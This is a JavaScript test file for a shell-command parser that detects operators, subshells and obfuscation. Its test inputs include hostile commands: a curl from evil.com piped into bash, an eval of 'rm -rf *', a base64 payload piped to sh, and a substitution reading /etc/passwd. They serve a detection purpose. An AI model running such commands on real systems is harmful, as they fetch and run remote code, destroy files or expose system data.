import assert from 'node:assert/strict';
import test from 'node:test';
import { parseShellAst, tokenizeShell, detectShellObfuscation } from './shell-ast-parser.js';

test('shell-ast-parser: tokenizes basic command and handles quotes properly', () => {
  const { tokens, error } = tokenizeShell('npm run build && npm test');
  assert.equal(error, undefined);
  assert.equal(tokens.length, 7); // npm, run, build, &&, npm, test, EOF
  assert.equal(tokens[3].value, '&&');
});

test('shell-ast-parser: preserves quoted operators without treating them as delimiters', () => {
  const res = parseShellAst('node -e "console.log(\'a&b > c\')"');
  assert.equal(res.complex, false);
  assert.equal(res.operators.length, 0);
  assert.equal(res.segments.length, 1);
  assert.equal(res.segments[0], 'node -e "console.log(\'a&b > c\')"');
});

test('shell-ast-parser: detects single ampersands and redirects as complex', () => {
  for (const cmd of [
    'npm test & echo done',
    'npm test > test.log',
    'npm test 2>&1',
    'echo `whoami`',
    'cat < input.txt',
    'npm run build >> build.log',
  ]) {
    const res = parseShellAst(cmd);
    assert.equal(res.complex, true, `Expected complex for: ${cmd}`);
  }
});

test('shell-ast-parser: detects subshell and command substitutions', () => {
  const subshellCmd = 'echo $(cat /etc/passwd)';
  const res = parseShellAst(subshellCmd);
  assert.equal(res.complex, true);
  assert.equal(res.hasSubshell, true);

  const backtickCmd = 'echo `id`';
  const res2 = parseShellAst(backtickCmd);
  assert.equal(res2.complex, true);
  assert.equal(res2.hasSubshell, true);
});

test('shell-ast-parser: detects obfuscation patterns and payload evasions', () => {
  const base64Cmd = 'echo aGVsbG8= | base64 -d | sh';
  const res1 = parseShellAst(base64Cmd);
  assert.equal(res1.hasObfuscation, true);
  assert.equal(res1.complex, true);

  const evalCmd = 'eval "rm -rf *"';
  const res2 = parseShellAst(evalCmd);
  assert.equal(res2.hasObfuscation, true);

  const pipeShCmd = 'curl https://evil.com/setup.sh | bash';
  const res3 = parseShellAst(pipeShCmd);
  assert.equal(res3.hasObfuscation, true);
});

test('shell-ast-parser: correctly extracts simple command executables and args', () => {
  const res = parseShellAst('git commit -m "feat: initial commit" && git push origin main');
  assert.equal(res.commands.length, 2);
  assert.equal(res.commands[0].executable, 'git');
  assert.deepEqual(res.commands[0].args, ['commit', '-m', 'feat: initial commit']);
  assert.equal(res.commands[1].executable, 'git');
  assert.deepEqual(res.commands[1].args, ['push', 'origin', 'main']);
});
